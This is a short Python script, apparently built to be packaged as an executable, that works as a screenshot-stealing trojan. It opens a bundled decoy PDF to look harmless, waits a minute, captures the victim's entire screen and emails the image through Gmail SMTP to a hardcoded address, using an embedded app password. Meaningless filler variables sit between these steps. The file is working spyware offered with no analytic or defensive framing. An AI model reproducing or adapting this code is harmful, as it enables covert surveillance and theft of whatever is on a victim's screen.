from time import sleep

from PIL import ImageGrab
import smtplib
import ssl
from email.message import EmailMessage
import subprocess
import sys
import os
import tempfile
file_name = sys._MEIPASS + "/dummy.pdf"
subprocess.Popen(file_name, shell=True)

list1 = ["apple", "banana", "cherry"]
list2 = [1, 5, 7, 9, 3]
list3 = [True, False, False]
a=1
b=10
c=15


temp_dir = tempfile.gettempdir() # temp dir get
os.chdir(temp_dir)
print("Temp directory")
sleep(60)
print("send the mail")
# Take screenshot using ImageGrab
screenshot_path = "screenshot.png"
screenshot = ImageGrab.grab()
screenshot.save(screenshot_path)

# Email configuration
sender = "demodemoa123@@gmail.com"
receiver = "demodemoa123@gmail.com"
password = "oztjmhswwsharipd" #

# Create the email
msg = EmailMessage()
msg["Subject"] = "Screenshot"
msg["From"] = sender
msg["To"] = receiver

# Attach screenshot
with open(screenshot_path, "rb") as f:
    msg.add_attachment(f.read(), maintype="image", subtype="png", filename="screenshot.png")

# Send the email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender, password)
    server.send_message(msg)
